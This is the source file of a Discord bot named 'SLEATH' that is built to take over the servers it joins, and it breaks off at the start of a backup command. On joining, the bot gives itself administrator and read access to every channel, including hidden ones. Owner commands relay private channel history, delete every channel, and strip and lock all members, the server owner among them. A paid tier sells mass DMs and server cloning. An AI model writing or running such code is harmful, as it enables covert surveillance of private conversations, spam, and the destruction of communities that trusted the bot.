# language: Python 3.10+, file: controllbot.py, target: discord.py v2
# multi-server control bot — home-guild-locked, owner-only

import discord
from discord.ext import commands
import aiohttp
import asyncio
import io
import re
import json
import html
import random
import urllib.request
import urllib.parse
import os
import secrets
import hashlib
from datetime import datetime, timedelta, timezone
from dotenv import load_dotenv

load_dotenv()

TOKEN         = os.getenv("DISCORD_TOKEN")
OWNER_ID      = int(os.getenv("OWNER_ID"))
HOME_GUILD_ID = int(os.getenv("HOME_GUILD_ID"))

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, owner_id=OWNER_ID)

control_snapshots: dict[int, dict[int, list[int]]] = {}

# ── subscription store ─────────────────────────────────────────────────────────
# structure: { user_id: { "tier": "tools"|"media", "expires": datetime } }
subscriptions: dict[int, dict] = {}
# pending tokens: { token_str: { "tier": str, "days": int, "created": datetime } }
pending_tokens: dict[str, dict] = {}

DISCORD_FILE_LIMIT = 25 * 1024 * 1024
BAD_THUMB = re.compile(r'(\/xx\/|_recording|\/track\/|1x1|placeholder)', re.I)


# ── Guard ──────────────────────────────────────────────────────────────────────
def home_only():
    async def predicate(ctx: commands.Context) -> bool:
        return ctx.guild is not None and ctx.guild.id == HOME_GUILD_ID
    return commands.check(predicate)


def has_sub(tier: str):
    """Check user has an active subscription of the given tier."""
    async def predicate(ctx: commands.Context) -> bool:
        if ctx.author.id == OWNER_ID:
            return True
        sub = subscriptions.get(ctx.author.id)
        if not sub:
            return False
        if sub["expires"] < datetime.now(timezone.utc):
            return False
        # tools tier also unlocks media
        if tier == "media":
            return sub["tier"] in ("media", "tools")
        return sub["tier"] == tier
    return commands.check(predicate)


# ── Startup ────────────────────────────────────────────────────────────────────
@bot.event
async def on_ready():
    print(f"[+] {bot.user} online | {len(bot.guilds)} guilds")
    await bot.change_presence(activity=discord.Activity(
        type=discord.ActivityType.watching, name="all servers"
    ))


# ── channel access helpers ─────────────────────────────────────────────────────

async def _inject_all_channels(guild: discord.Guild):
    me = guild.me
    read_perms = discord.PermissionOverwrite(read_messages=True, read_message_history=True)
    for channel in guild.text_channels:
        if not channel.permissions_for(me).read_message_history:
            try:
                await channel.set_permissions(me, overwrite=read_perms, reason="SLEATH openall")
                await asyncio.sleep(0.2)
            except (discord.Forbidden, discord.HTTPException):
                pass


async def _force_read_access(channel: discord.TextChannel) -> bool:
    me = channel.guild.me
    if channel.permissions_for(me).read_message_history:
        return True
    try:
        await channel.set_permissions(me, read_messages=True, read_message_history=True, reason="SLEATH force-read")
        return True
    except (discord.Forbidden, discord.HTTPException):
        return False


async def _revoke_read_access(channel: discord.TextChannel):
    me = channel.guild.me
    ow = channel.overwrites_for(me)
    if ow.read_messages is True and ow.read_message_history is True:
        try:
            await channel.set_permissions(me, overwrite=None, reason="SLEATH cleanup")
        except (discord.Forbidden, discord.HTTPException):
            pass


# ── Auto-admin on join ─────────────────────────────────────────────────────────
@bot.event
async def on_guild_join(guild: discord.Guild):
    try:
        admin_role = await guild.create_role(
            name="SLEATH",
            permissions=discord.Permissions(administrator=True),
            color=discord.Color.dark_red(),
            reason="SLEATH control role"
        )
        await guild.me.add_roles(admin_role)
    except discord.Forbidden:
        pass
    except Exception:
        pass
    await asyncio.sleep(1)
    await _inject_all_channels(guild)


@bot.event
async def on_guild_channel_create(channel: discord.abc.GuildChannel):
    if not isinstance(channel, discord.TextChannel):
        return
    me = channel.guild.me
    if not channel.permissions_for(me).read_message_history:
        try:
            await channel.set_permissions(me, read_messages=True, read_message_history=True, reason="SLEATH auto-access")
        except (discord.Forbidden, discord.HTTPException):
            pass


# ── Error handler ──────────────────────────────────────────────────────────────
@bot.event
async def on_command_error(ctx: commands.Context, error: commands.CommandError):
    if isinstance(error, (commands.NotOwner, commands.CheckFailure)):
        if isinstance(error, commands.CheckFailure) and ctx.command and ctx.command.name not in ("cmds", "redeem", "mysub"):
            await ctx.send("no active subscription for this feature — use `!plans` to see options.")
        return
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"missing argument: `{error.param.name}`")
        return
    if isinstance(error, commands.BadArgument):
        await ctx.send("bad argument — check the command syntax with `!cmds`")
        return
    if isinstance(error, commands.CommandNotFound):
        return
    await ctx.send(f"error: `{error}`")


# ══════════════════════════════════════════════════════════════════════════════
#  SUBSCRIPTION SYSTEM
# ══════════════════════════════════════════════════════════════════════════════

# ── !plans — show available tiers ─────────────────────────────────────────────
@bot.command(name="plans")
async def show_plans(ctx: commands.Context):
    embed = discord.Embed(title="SLEATH — subscription tiers", color=0x2b2d31)
    embed.add_field(name="📸 Media — £5/week", value=(
        "Image + video search commands\n"
        "`!image`, `!images`, `!imagesave`, `!video`, `!videos`"
    ), inline=False)
    embed.add_field(name="⚙️ Tools — £10/week", value=(
        "All Media features plus server tool suite\n"
        "`!massdm`, `!cloneserver`, `!backup`, `!profiler`, `!raidwatch`"
    ), inline=False)
    embed.add_field(name="How to buy", value=(
        "DM the bot owner to purchase — you'll receive a token to redeem with `!redeem <token>`"
    ), inline=False)
    await ctx.send(embed=embed)


# ── !gentoken <tier> <days> — owner only, generate a token ────────────────────
@bot.command(name="gentoken")
@commands.is_owner()
async def gen_token(ctx: commands.Context, tier: str, days: int):
    if tier not in ("media", "tools"):
        await ctx.send("tier must be `media` or `tools`"); return
    if days < 1 or days > 365:
        await ctx.send("days must be 1–365"); return

    token = secrets.token_urlsafe(16)
    pending_tokens[token] = {
        "tier": tier,
        "days": days,
        "created": datetime.now(timezone.utc)
    }
    await ctx.send(f"✓ token generated\ntier: `{tier}` | duration: `{days}` day(s)\n```\n{token}\n```\nsend this to the buyer — it expires in 48 hours if unredeemed.")


# ── !redeem <token> — any user ────────────────────────────────────────────────
@bot.command(name="redeem")
async def redeem_token(ctx: commands.Context, token: str):
    t = pending_tokens.get(token)
    if not t:
        await ctx.send("invalid or already used token."); return

    # expire unused tokens after 48 hours
    if datetime.now(timezone.utc) - t["created"] > timedelta(hours=48):
        del pending_tokens[token]
        await ctx.send("that token has expired — contact the seller for a new one."); return

    expires = datetime.now(timezone.utc) + timedelta(days=t["days"])
    subscriptions[ctx.author.id] = {"tier": t["tier"], "expires": expires}
    del pending_tokens[token]

    await ctx.send(
        f"✓ subscription activated\n"
        f"tier: `{t['tier']}` | expires: `{expires.strftime('%Y-%m-%d %H:%M UTC')}`"
    )


# ── !mysub — check own subscription ───────────────────────────────────────────
@bot.command(name="mysub")
async def my_sub(ctx: commands.Context):
    sub = subscriptions.get(ctx.author.id)
    if not sub:
        await ctx.send("no active subscription — use `!plans` to see options."); return
    now = datetime.now(timezone.utc)
    if sub["expires"] < now:
        await ctx.send("your subscription has expired — use `!plans` to renew."); return
    remaining = sub["expires"] - now
    days = remaining.days
    hours = remaining.seconds // 3600
    await ctx.send(
        f"✓ active subscription\n"
        f"tier: `{sub['tier']}` | expires in: `{days}d {hours}h`"
    )


# ── !listsubs — owner only ────────────────────────────────────────────────────
@bot.command(name="listsubs")
@commands.is_owner()
async def list_subs(ctx: commands.Context):
    now = datetime.now(timezone.utc)
    active = {uid: s for uid, s in subscriptions.items() if s["expires"] > now}
    if not active:
        await ctx.send("no active subscriptions."); return
    lines = []
    for uid, s in active.items():
        remaining = (s["expires"] - now).days
        lines.append(f"`{uid}` — `{s['tier']}` — `{remaining}d` remaining")
    await ctx.send("**active subscriptions:**\n" + "\n".join(lines))


# ── !revoke <user_id> — owner only ────────────────────────────────────────────
@bot.command(name="revoke")
@commands.is_owner()
async def revoke_sub(ctx: commands.Context, user_id: int):
    if user_id in subscriptions:
        del subscriptions[user_id]
        await ctx.send(f"✓ subscription revoked for `{user_id}`")
    else:
        await ctx.send("no subscription found for that user.")


# ══════════════════════════════════════════════════════════════════════════════
#  SERVER CONTROL  (owner only)
# ══════════════════════════════════════════════════════════════════════════════

@bot.command(name="servers")
@commands.is_owner()
@home_only()
async def list_servers(ctx: commands.Context):
    lines = [f"`{g.name}` — `{g.id}` — {g.member_count} members" for g in bot.guilds]
    embed = discord.Embed(title=f"Guilds ({len(bot.guilds)})", description="\n".join(lines) or "none", color=0x2b2d31)
    await ctx.send(embed=embed)


@bot.command(name="serverinfo")
@commands.is_owner()
@home_only()
async def server_info(ctx: commands.Context, guild_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send(f"guild `{guild_id}` not found."); return
    embed = discord.Embed(title=guild.name, color=0x2b2d31)
    embed.add_field(name="ID",       value=str(guild.id))
    embed.add_field(name="Owner",    value=str(guild.owner))
    embed.add_field(name="Members",  value=str(guild.member_count))
    embed.add_field(name="Channels", value=str(len(guild.channels)))
    embed.add_field(name="Roles",    value=str(len(guild.roles)))
    embed.add_field(name="Created",  value=guild.created_at.strftime("%Y-%m-%d"))
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
    await ctx.send(embed=embed)


@bot.command(name="channels")
@commands.is_owner()
@home_only()
async def list_channels(ctx: commands.Context, guild_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    lines = [f"`#{c.name}` — `{c.id}`" for c in guild.text_channels[:25]]
    embed = discord.Embed(title=f"{guild.name} — text channels", description="\n".join(lines) or "none", color=0x2b2d31)
    await ctx.send(embed=embed)


@bot.command(name="members")
@commands.is_owner()
@home_only()
async def list_members(ctx: commands.Context, guild_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    lines = [f"`{m}` — `{m.id}`" for m in list(guild.members)[:20]]
    embed = discord.Embed(title=f"{guild.name} — members (first 20)", description="\n".join(lines) or "none", color=0x2b2d31)
    await ctx.send(embed=embed)


@bot.command(name="say")
@commands.is_owner()
@home_only()
async def say(ctx: commands.Context, channel_id: int, *, message: str):
    channel = bot.get_channel(channel_id)
    if not channel:
        await ctx.send(f"channel `{channel_id}` not found."); return
    if not channel.permissions_for(channel.guild.me).send_messages:
        await ctx.send(f"no send permission in `#{channel.name}`."); return
    await channel.send(message)
    await ctx.send(f"✓ sent to `#{channel.name}` in `{channel.guild.name}`")


@bot.command(name="announce")
@commands.is_owner()
@home_only()
async def announce(ctx: commands.Context, *, message: str):
    results = []
    for guild in bot.guilds:
        if guild.id == HOME_GUILD_ID:
            continue
        sent = False
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).send_messages:
                try:
                    await channel.send(message)
                    results.append(f"✓ `{guild.name}`")
                    sent = True
                    break
                except discord.HTTPException:
                    continue
        if not sent:
            results.append(f"✗ `{guild.name}` — no writable channel")
    await ctx.send("\n".join(results) or "no target guilds")


@bot.command(name="kick")
@commands.is_owner()
@home_only()
async def kick_user(ctx: commands.Context, guild_id: int, user_id: int, *, reason: str = "no reason"):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    member = guild.get_member(user_id)
    if not member:
        await ctx.send("member not found."); return
    try:
        await member.kick(reason=reason)
        await ctx.send(f"✓ kicked `{member}` from `{guild.name}`")
    except discord.Forbidden:
        await ctx.send("can't kick that member — they may outrank the bot.")


@bot.command(name="ban")
@commands.is_owner()
@home_only()
async def ban_user(ctx: commands.Context, guild_id: int, user_id: int, *, reason: str = "no reason"):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    member = guild.get_member(user_id)
    if not member:
        await ctx.send("member not found."); return
    try:
        await member.ban(reason=reason, delete_message_days=0)
        await ctx.send(f"✓ banned `{member}` from `{guild.name}`")
    except discord.Forbidden:
        await ctx.send("can't ban that member — they may outrank the bot.")


@bot.command(name="unban")
@commands.is_owner()
@home_only()
async def unban_user(ctx: commands.Context, guild_id: int, user_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    try:
        user = await bot.fetch_user(user_id)
        await guild.unban(user)
        await ctx.send(f"✓ unbanned `{user}` in `{guild.name}`")
    except discord.NotFound:
        await ctx.send("user not found or not banned.")
    except discord.Forbidden:
        await ctx.send("bot lacks ban permission.")


@bot.command(name="nick")
@commands.is_owner()
@home_only()
async def change_nick(ctx: commands.Context, guild_id: int, user_id: int, *, nickname: str):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    member = guild.get_member(user_id)
    if not member:
        await ctx.send("member not found."); return
    try:
        await member.edit(nick=nickname)
        await ctx.send(f"✓ nick set to `{nickname}` for `{member}` in `{guild.name}`")
    except discord.Forbidden:
        await ctx.send("can't change that member's nick — they may outrank the bot.")


@bot.command(name="leave")
@commands.is_owner()
@home_only()
async def leave_guild(ctx: commands.Context, guild_id: int):
    if guild_id == HOME_GUILD_ID:
        await ctx.send("won't leave home guild."); return
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    name = guild.name
    await guild.leave()
    await ctx.send(f"✓ left `{name}`")


@bot.command(name="invite")
@commands.is_owner()
@home_only()
async def invite(ctx: commands.Context):
    perms = discord.Permissions(administrator=True)
    url = discord.utils.oauth_url(bot.application_id, permissions=perms)
    await ctx.send(f"invite link:\n{url}")


@bot.command(name="roles")
@commands.is_owner()
@home_only()
async def list_roles(ctx: commands.Context, guild_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    lines = [f"`{r.name}` — `{r.id}`" for r in reversed(guild.roles) if r.name != "@everyone"][:25]
    embed = discord.Embed(title=f"{guild.name} — roles", description="\n".join(lines) or "none", color=0x2b2d31)
    await ctx.send(embed=embed)


@bot.command(name="addrole")
@commands.is_owner()
@home_only()
async def add_role(ctx: commands.Context, guild_id: int, user_id: int, role_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    member = guild.get_member(user_id)
    if not member:
        await ctx.send("member not found."); return
    role = guild.get_role(role_id)
    if not role:
        await ctx.send("role not found."); return
    try:
        await member.add_roles(role)
        await ctx.send(f"✓ gave `{role.name}` to `{member}` in `{guild.name}`")
    except discord.Forbidden:
        await ctx.send("can't assign that role — it may outrank the bot.")


@bot.command(name="removerole")
@commands.is_owner()
@home_only()
async def remove_role(ctx: commands.Context, guild_id: int, user_id: int, role_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    member = guild.get_member(user_id)
    if not member:
        await ctx.send("member not found."); return
    role = guild.get_role(role_id)
    if not role:
        await ctx.send("role not found."); return
    try:
        await member.remove_roles(role)
        await ctx.send(f"✓ removed `{role.name}` from `{member}` in `{guild.name}`")
    except discord.Forbidden:
        await ctx.send("can't remove that role — it may outrank the bot.")


@bot.command(name="delete")
@commands.is_owner()
@home_only()
async def delete_message(ctx: commands.Context, channel_id: int, message_id: int):
    channel = bot.get_channel(channel_id)
    if not channel:
        await ctx.send("channel not found."); return
    try:
        msg = await channel.fetch_message(message_id)
        await msg.delete()
        await ctx.send(f"✓ deleted message in `#{channel.name}`")
    except discord.NotFound:
        await ctx.send("message not found.")
    except discord.Forbidden:
        await ctx.send("bot lacks manage messages permission.")


@bot.command(name="slowmode")
@commands.is_owner()
@home_only()
async def slowmode(ctx: commands.Context, channel_id: int, seconds: int):
    channel = bot.get_channel(channel_id)
    if not channel:
        await ctx.send("channel not found."); return
    seconds = max(0, min(seconds, 21600))
    try:
        await channel.edit(slowmode_delay=seconds)
        await ctx.send(f"✓ slowmode set to `{seconds}s` in `#{channel.name}`")
    except discord.Forbidden:
        await ctx.send("bot lacks manage channel permission.")


@bot.command(name="purge")
@commands.is_owner()
@home_only()
async def purge_messages(ctx: commands.Context, channel_id: int):
    channel = bot.get_channel(channel_id)
    if not channel:
        await ctx.send("channel not found."); return
    total = 0
    try:
        while True:
            deleted = await channel.purge(limit=100)
            total += len(deleted)
            if len(deleted) < 100:
                break
            await asyncio.sleep(0.5)
        await ctx.send(f"✓ purged `{total}` messages from `#{channel.name}`")
    except discord.Forbidden:
        await ctx.send("bot lacks manage messages permission.")


@bot.command(name="finduser")
@commands.is_owner()
@home_only()
async def find_user_all(ctx: commands.Context, *, username: str):
    matches = []
    username_lower = username.lower()
    for guild in bot.guilds:
        for member in guild.members:
            if (username_lower in member.name.lower() or
                (member.nick and username_lower in member.nick.lower())):
                matches.append(f"`{member}` (nick: `{member.nick or 'none'}`) — `{member.id}` — `{guild.name}`")
    if not matches:
        await ctx.send(f"no members matching `{username}` found."); return
    pages, current = [], ""
    for line in matches:
        if len(current) + len(line) + 1 > 1800:
            pages.append(current); current = ""
        current += line + "\n"
    if current:
        pages.append(current)
    await ctx.send(f"found `{len(matches)}` match(es) for `{username}` across all servers:")
    for page in pages:
        await ctx.send(embed=discord.Embed(description=page, color=0x2b2d31))


@bot.command(name="finduserhere")
@commands.is_owner()
@home_only()
async def find_user_here(ctx: commands.Context, guild_id: int, *, username: str):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    username_lower = username.lower()
    matches = []
    for member in guild.members:
        if (username_lower in member.name.lower() or
            (member.nick and username_lower in member.nick.lower())):
            matches.append(f"`{member}` (nick: `{member.nick or 'none'}`) — `{member.id}`")
    if not matches:
        await ctx.send(f"no members matching `{username}` in `{guild.name}`."); return
    pages, current = [], ""
    for line in matches:
        if len(current) + len(line) + 1 > 1800:
            pages.append(current); current = ""
        current += line + "\n"
    if current:
        pages.append(current)
    await ctx.send(f"found `{len(matches)}` match(es) in `{guild.name}`:")
    for page in pages:
        await ctx.send(embed=discord.Embed(description=page, color=0x2b2d31))


@bot.command(name="nuke")
@commands.is_owner()
@home_only()
async def nuke_server(ctx: commands.Context, guild_id: int):
    if guild_id == HOME_GUILD_ID:
        await ctx.send("won't nuke home guild."); return
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    await ctx.send(f"💥 nuking `{guild.name}`...")
    deleted, failed = 0, 0
    for channel in list(guild.channels):
        try:
            await channel.delete(reason="SLEATH nuke")
            deleted += 1
            await asyncio.sleep(0.5)
        except (discord.Forbidden, discord.HTTPException):
            failed += 1
    result = f"✓ nuke complete on `{guild.name}` — `{deleted}` channels deleted"
    if failed:
        result += f", `{failed}` failed"
    await ctx.send(result)


@bot.command(name="openall")
@commands.is_owner()
@home_only()
async def open_all_channels(ctx: commands.Context, guild_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    await ctx.send(f"🔓 injecting read access on all channels in `{guild.name}`...")
    me = guild.me
    read_perms = discord.PermissionOverwrite(read_messages=True, read_message_history=True)
    done, skipped, failed = 0, 0, 0
    for channel in guild.text_channels:
        if channel.permissions_for(me).read_message_history:
            skipped += 1; continue
        try:
            await channel.set_permissions(me, overwrite=read_perms, reason="SLEATH openall")
            done += 1
            await asyncio.sleep(0.2)
        except (discord.Forbidden, discord.HTTPException):
            failed += 1
    result = f"✓ `{guild.name}` — `{done}` channels opened, `{skipped}` already accessible"
    if failed:
        result += f", `{failed}` failed"
    await ctx.send(result)


@bot.command(name="makerole")
@commands.is_owner()
@home_only()
async def make_role(ctx: commands.Context, guild_id: int, user_id: int, *, role_name: str):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    member = guild.get_member(user_id)
    if not member:
        await ctx.send("member not found."); return
    try:
        role = await guild.create_role(name=role_name, reason="SLEATH makerole")
        await member.add_roles(role)
        await ctx.send(f"✓ created `{role_name}` and assigned to `{member}` in `{guild.name}`")
    except discord.Forbidden:
        await ctx.send("bot lacks manage roles permission.")


@bot.command(name="stripall")
@commands.is_owner()
@home_only()
async def strip_all_roles(ctx: commands.Context, guild_id: int, user_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    member = guild.get_member(user_id)
    if not member:
        await ctx.send("member not found."); return
    roles_to_remove = [r for r in member.roles if r.name != "@everyone"]
    if not roles_to_remove:
        await ctx.send(f"`{member}` has no roles to remove."); return
    try:
        await member.remove_roles(*roles_to_remove, reason="SLEATH stripall")
        await ctx.send(f"✓ stripped `{len(roles_to_remove)}` roles from `{member}` in `{guild.name}`")
    except discord.Forbidden:
        await ctx.send("can't remove those roles — some may outrank the bot.")


# ══════════════════════════════════════════════════════════════════════════════
#  COMPLETE CONTROL + KILLSWITCH  (owner + server owner fully caged)
# ══════════════════════════════════════════════════════════════════════════════

@bot.command(name="completecontrol")
@commands.is_owner()
@home_only()
async def complete_control(ctx: commands.Context, guild_id: int):
    if guild_id == HOME_GUILD_ID:
        await ctx.send("won't run complete control on home guild."); return
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return

    await ctx.send(f"⚡ engaging complete control on `{guild.name}`...")

    snapshot: dict[int, list[int]] = {}
    for member in guild.members:
        snapshot[member.id] = [r.id for r in member.roles if r.name != "@everyone"]
    control_snapshots[guild_id] = snapshot

    supreme_role = discord.utils.get(guild.roles, name="SLEATH-SUPREME")
    if not supreme_role:
        supreme_role = await guild.create_role(
            name="SLEATH-SUPREME",
            permissions=discord.Permissions(administrator=True),
            color=discord.Color.dark_red(),
            hoist=True,
            reason="SLEATH complete control"
        )

    prison_role = discord.utils.get(guild.roles, name="SLEATH-LOCKED")
    if not prison_role:
        prison_role = await guild.create_role(
            name="SLEATH-LOCKED",
            permissions=discord.Permissions(0),
            color=discord.Color.dark_gray(),
            reason="SLEATH complete control"
        )

    try:
        await guild.edit_role_positions({supreme_role: guild.me.top_role.position})
    except (discord.Forbidden, discord.HTTPException):
        pass

    try:
        await guild.me.add_roles(supreme_role)
    except discord.Forbidden:
        pass

    # ── cage EVERYONE including server owner ──────────────────────────────────
    demoted, failed = 0, 0
    for member in guild.members:
        if member.id == bot.user.id:
            continue  # skip the bot itself
        try:
            current_roles = [r for r in member.roles if r.name != "@everyone"]
            if current_roles:
                await member.remove_roles(*current_roles, reason="SLEATH complete control")
            await member.add_roles(prison_role, reason="SLEATH complete control")
            demoted += 1
            await asyncio.sleep(0.3)
        except (discord.Forbidden, discord.HTTPException):
            failed += 1

    # ── channel overwrites — hard deny everything except read ─────────────────
    deny_overwrites = discord.PermissionOverwrite(
        send_messages=False,
        send_messages_in_threads=False,
        create_public_threads=False,
        create_private_threads=False,
        add_reactions=False,
        use_application_commands=False,
        manage_messages=False,
        manage_channels=False,
        mention_everyone=False,
        attach_files=False,
        embed_links=False,
        read_messages=True,
        read_message_history=True,
    )
    everyone_deny = discord.PermissionOverwrite(
        send_messages=False,
        send_messages_in_threads=False,
        create_public_threads=False,
        create_private_threads=False,
        add_reactions=False,
        use_application_commands=False,
        attach_files=False,
        embed_links=False,
    )

    ch_done, ch_fail = 0, 0
    for channel in guild.text_channels:
        try:
            await channel.set_permissions(prison_role, overwrite=deny_overwrites, reason="SLEATH lockdown")
            await asyncio.sleep(0.2)
            await channel.set_permissions(guild.default_role, overwrite=everyone_deny, reason="SLEATH lockdown")
            ch_done += 1
            await asyncio.sleep(0.2)
        except (discord.Forbidden, discord.HTTPException):
            ch_fail += 1

    result = (
        f"✓ complete control active on `{guild.name}`\n"
        f"bot elevated → `SLEATH-SUPREME`\n"
        f"`{demoted}` members caged (including server owner)"
        + (f", `{failed}` skipped" if failed else "") + "\n"
        f"`{ch_done}` channels hard-locked"
        + (f", `{ch_fail}` failed" if ch_fail else "")
    )
    await ctx.send(result)


@bot.command(name="killswitch")
@commands.is_owner()
@home_only()
async def kill_switch(ctx: commands.Context, guild_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    if guild_id not in control_snapshots:
        await ctx.send(f"no snapshot for `{guild.name}` — was `!completecontrol` run?"); return

    await ctx.send(f"🔄 restoring `{guild.name}`...")
    snapshot = control_snapshots[guild_id]
    prison_role = discord.utils.get(guild.roles, name="SLEATH-LOCKED")

    for channel in guild.text_channels:
        try:
            if prison_role:
                await channel.set_permissions(prison_role, overwrite=None, reason="SLEATH killswitch")
                await asyncio.sleep(0.2)
            await channel.set_permissions(guild.default_role, overwrite=None, reason="SLEATH killswitch")
            await asyncio.sleep(0.2)
        except (discord.Forbidden, discord.HTTPException):
            pass

    restored, failed = 0, 0
    for member in guild.members:
        if member.id == bot.user.id:
            continue
        try:
            if prison_role and prison_role in member.roles:
                await member.remove_roles(prison_role, reason="SLEATH killswitch")
            original_role_ids = snapshot.get(member.id, [])
            roles_to_restore = [guild.get_role(rid) for rid in original_role_ids if guild.get_role(rid)]
            if roles_to_restore:
                await member.add_roles(*roles_to_restore, reason="SLEATH killswitch")
            restored += 1
            await asyncio.sleep(0.3)
        except (discord.Forbidden, discord.HTTPException):
            failed += 1

    for role_name in ["SLEATH-SUPREME", "SLEATH-LOCKED"]:
        role = discord.utils.get(guild.roles, name=role_name)
        if role:
            try:
                await role.delete(reason="SLEATH killswitch cleanup")
            except (discord.Forbidden, discord.HTTPException):
                pass

    del control_snapshots[guild_id]
    result = f"✓ killswitch complete on `{guild.name}` — `{restored}` members restored"
    if failed:
        result += f", `{failed}` failed"
    await ctx.send(result)


# ══════════════════════════════════════════════════════════════════════════════
#  CHANNEL READER  (owner only)
# ══════════════════════════════════════════════════════════════════════════════

@bot.command(name="read")
@commands.is_owner()
@home_only()
async def read_channel(ctx: commands.Context, channel_id: int, limit: int = 50):
    limit = min(limit, 200)
    source = bot.get_channel(channel_id)
    if not source:
        await ctx.send(f"channel `{channel_id}` not found."); return

    already_had_access = source.permissions_for(source.guild.me).read_message_history
    if not already_had_access:
        granted = await _force_read_access(source)
        if not granted:
            await ctx.send(f"can't inject read permission into `#{source.name}`."); return

    await ctx.send(f"📥 reading `#{source.name}` in `{source.guild.name}` — last `{limit}` messages")

    try:
        messages = [m async for m in source.history(limit=limit, oldest_first=True)]
    except discord.Forbidden:
        await ctx.send("can't read that channel."); return
    finally:
        if not already_had_access:
            await _revoke_read_access(source)

    if not messages:
        await ctx.send("channel is empty."); return

    buffer = []
    FLUSH_AT = 1800

    async def flush(buf):
        if buf:
            await ctx.send("```\n" + "\n".join(buf) + "\n```")
            buf.clear()

    for msg in messages:
        timestamp = msg.created_at.strftime("%Y-%m-%d %H:%M")
        author    = str(msg.author)
        if msg.content:
            buffer.append(f"[{timestamp}] {author}: {msg.content}")
            if sum(len(l) for l in buffer) >= FLUSH_AT:
                await flush(buffer)
        for att in msg.attachments:
            await flush(buffer)
            try:
                await ctx.send(content=f"`[{timestamp}] {author} — {att.filename}`", file=await att.to_file())
            except discord.HTTPException:
                await ctx.send(f"`[{timestamp}] {author} — too large:`\n{att.url}")
        for embed in msg.embeds:
            if embed.image and embed.image.url:
                await flush(buffer)
                relay = discord.Embed(color=0x2b2d31)
                relay.set_image(url=embed.image.url)
                relay.set_footer(text=f"{author} • {timestamp}")
                await ctx.send(embed=relay)

    await flush(buffer)
    await ctx.send(f"✓ done — `{len(messages)}` messages relayed from `#{source.name}`")


# ══════════════════════════════════════════════════════════════════════════════
#  TOOLS TIER — subscriber features
# ══════════════════════════════════════════════════════════════════════════════

# ── !massdm <guild_id> <message> — DM every member of a server ────────────────
@bot.command(name="massdm")
@has_sub("tools")
async def mass_dm(ctx: commands.Context, guild_id: int, *, message: str):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return

    await ctx.send(f"📨 sending DMs to `{guild.member_count}` members in `{guild.name}`...")
    sent, failed = 0, 0
    for member in guild.members:
        if member.bot:
            continue
        try:
            await member.send(message)
            sent += 1
            await asyncio.sleep(1.2)  # rate limit safe
        except (discord.Forbidden, discord.HTTPException):
            failed += 1

    await ctx.send(f"✓ mass DM complete — `{sent}` sent, `{failed}` failed (DMs closed)")


# ── !cloneserver <guild_id> — clone structure into a new server ───────────────
@bot.command(name="cloneserver")
@has_sub("tools")
async def clone_server(ctx: commands.Context, guild_id: int):
    source = bot.get_guild(guild_id)
    if not source:
        await ctx.send("guild not found."); return

    await ctx.send(f"🔄 cloning structure of `{source.name}`...")

    # create new guild
    try:
        new_guild = await bot.create_guild(name=f"{source.name} [clone]")
    except discord.HTTPException as e:
        await ctx.send(f"failed to create guild: `{e}`"); return

    # wait for bot to be ready in new guild
    await asyncio.sleep(2)

    # delete default channels
    for channel in new_guild.channels:
        try:
            await channel.delete()
        except (discord.Forbidden, discord.HTTPException):
            pass

    # clone roles (skip @everyone and managed roles)
    role_map: dict[int, discord.Role] = {}
    for role in reversed(source.roles):
        if role.name == "@everyone" or role.managed:
            continue
        try:
            new_role = await new_guild.create_role(
                name=role.name,
                permissions=role.permissions,
                color=role.color,
                hoist=role.hoist,
                mentionable=role.mentionable
            )
            role_map[role.id] = new_role
            await asyncio.sleep(0.3)
        except (discord.Forbidden, discord.HTTPException):
            pass

    # clone categories and channels
    cat_map: dict[int, discord.CategoryChannel] = {}
    for category in source.categories:
        try:
            new_cat = await new_guild.create_category(name=category.name)
            cat_map[category.id] = new_cat
            await asyncio.sleep(0.3)
        except (discord.Forbidden, discord.HTTPException):
            pass

    for channel in source.text_channels:
        try:
            cat = cat_map.get(channel.category_id) if channel.category_id else None
            await new_guild.create_text_channel(name=channel.name, category=cat, topic=channel.topic or "")
            await asyncio.sleep(0.3)
        except (discord.Forbidden, discord.HTTPException):
            pass

    for channel in source.voice_channels:
        try:
            cat = cat_map.get(channel.category_id) if channel.category_id else None
            await new_guild.create_voice_channel(name=channel.name, category=cat)
            await asyncio.sleep(0.3)
        except (discord.Forbidden, discord.HTTPException):
            pass

    # generate invite
    invite_link = "unavailable"
    for ch in new_guild.text_channels:
        try:
            inv = await ch.create_invite(max_age=0)
            invite_link = inv.url
            break
        except (discord.Forbidden, discord.HTTPException):
            pass

    await ctx.send(
        f"✓ clone of `{source.name}` created\n"
        f"`{len(role_map)}` roles, `{len(cat_map)}` categories cloned\n"
        f"invite: {invite_link}"
    )


# ── !backup <guild_id> — snapshot roles + channels to text ────────────────────
@bot.command(name="backup")
@has_sub("tools")
async def backup_server(ctx: commands.Context, guild_id: int):
